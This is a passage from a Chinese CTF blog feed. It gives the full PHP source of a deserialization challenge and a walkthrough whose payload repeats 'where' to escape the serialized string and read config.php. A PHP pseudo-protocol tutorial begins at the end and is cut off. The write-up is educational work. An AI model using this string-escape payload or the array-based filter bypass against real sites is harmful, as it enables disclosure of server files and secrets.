class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> __class__;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-title function_ invoke__">mysql_connect</span>(<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>],<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>]);<br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;link;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$ret</span> = <span class="hljs-string">&#x27;*&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT <span class="hljs-subst">$ret</span> FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$this</span>-&gt;link);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_fetch_object</span>(<span class="hljs-variable">$result</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span></span>) </span>&#123;<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$key_list</span>);<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="hljs-variable">$value_list</span>) . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>; <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO <span class="hljs-subst">$table</span> (<span class="hljs-subst">$key</span>) VALUES (<span class="hljs-subst">$value</span>)&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> __class__;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-variable">$config</span>);<br></code></pre></td></tr></table></figure><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>index.php</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>require_once(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &#123;<br>header(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">3</span> or strlen(<span class="hljs-variable">$username</span>) &gt; <span class="hljs-number">16</span>) <br>die(<span class="hljs-string">&#x27;Invalid user name&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">3</span> or strlen(<span class="hljs-variable">$password</span>) &gt; <span class="hljs-number">16</span>) <br>die(<span class="hljs-string">&#x27;Invalid password&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;<br>header(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>die(<span class="hljs-string">&#x27;Invalid user name or password&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>?&gt;<br></code></pre></td></tr></table></figure><p><strong>profile.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">show_profile</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$profile</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>);<br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>register.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid password&#x27;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">is_exists</span>(<span class="hljs-variable">$username</span>)) &#123;<br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">register</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;User name Already Exists&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>update.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">update_profile</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>解题思路</strong></p><p>config.php中有个flag变量，所以方向就是获得这个文件内容<br>找了其他文件发现profile.php中有一个很明显的file_get_contents()函数，它能将一整个文件读入字符串<br>所以要profile[‘photo’]=config.php，而它的值来自$profile的反序列化</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autoit">move_uploaded_file($file[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . md5($file[<span class="hljs-string">&#x27;name&#x27;</span>]))<span class="hljs-comment">;</span><br>$profile[<span class="hljs-string">&#x27;phone&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;phone&#x27;</span>]<span class="hljs-comment">;</span><br>$profile[<span class="hljs-string">&#x27;email&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;email&#x27;</span>]<span class="hljs-comment">;</span><br>$profile[<span class="hljs-string">&#x27;nickname&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>]<span class="hljs-comment">;</span><br>$profile[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . md5($file[<span class="hljs-string">&#x27;name&#x27;</span>])<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>说明不能直接bp抓包修改上传的文件名，因为有md5加密</p><p>在class.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>满足数组内容的字符串都会被替换为hacker，刚好where为五位可以使用反序列化字符串逃逸</p><p>调用链为update.php传参——update_profile()——class.php的update()——sql —— class.php的select()—— show_profile() ——profile.php的file_get_contents</p><p>注意传入nickname的时候有strlen()和preg_match()过滤</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if(<span class="hljs-name">preg_match</span>(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; <span class="hljs-number">10</span>)<br>die(&#x27;Invalid nickname&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>绕过表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(Array()</span></span>) = null<br><span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(Array()</span></span>) = null<br><span class="hljs-function"><span class="hljs-title">ereg</span><span class="hljs-params">(pattern,Array()</span></span>) =null<br><span class="hljs-function"><span class="hljs-title">preg_match</span><span class="hljs-params">(pattern,Array()</span></span>) = false<br><span class="hljs-function"><span class="hljs-title">strcmp</span><span class="hljs-params">(Array()</span></span>, “abc”) =null<br><span class="hljs-function"><span class="hljs-title">strpos</span><span class="hljs-params">(Array()</span></span>,“abc”) = null<br><span class="hljs-function"><span class="hljs-title">strlen</span><span class="hljs-params">(Array()</span></span>) = null<br></code></pre></td></tr></table></figure><p>传入数组判断为null和false避免触发die()</p><p>payload</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>注意s:5:”photo”;s:10:”config.php”;}前面加上一个}闭合数组<br>bp抓包修改后解码得到</p><p><a href="https://imgse.com/i/pFY9fHA"><img src="https://s11.ax1x.com/2024/02/19/pFY9fHA.md.png" alt="pFY9fHA.md.png"></a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP伪协议</title>
    <link href="/2022/12/22/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/12/22/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>根据官方文档（<a href="https://www.php.net/manual/zh/filters.php%EF%BC%89%E8%BF%87%E6%BB%A4%E5%99%A8%E5%8F%AF%E5%88%86%E4%B8%BA%E5%9B%9B%E7%A7%8D%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%8C%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%8C%E5%8E%8B%E7%BC%A9%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%8C%E5%8A%A0%E5%AF%86%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%82">https://www.php.net/manual/zh/filters.php）过滤器可分为四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。</a><br>1.字符串过滤器</p><p>字符串过滤器以string开头，如：string.rot13、string.toupper等<br>#string.rot13表示对数据进行rot13加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/read=string.rot13/resource=data://text/plain,zxcvb&quot;</span>);<br>输出结果为  mkpio<br></code></pre></td></tr></table></figure><p>2.转换过滤器</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">例如：<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode和<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-decode、<span 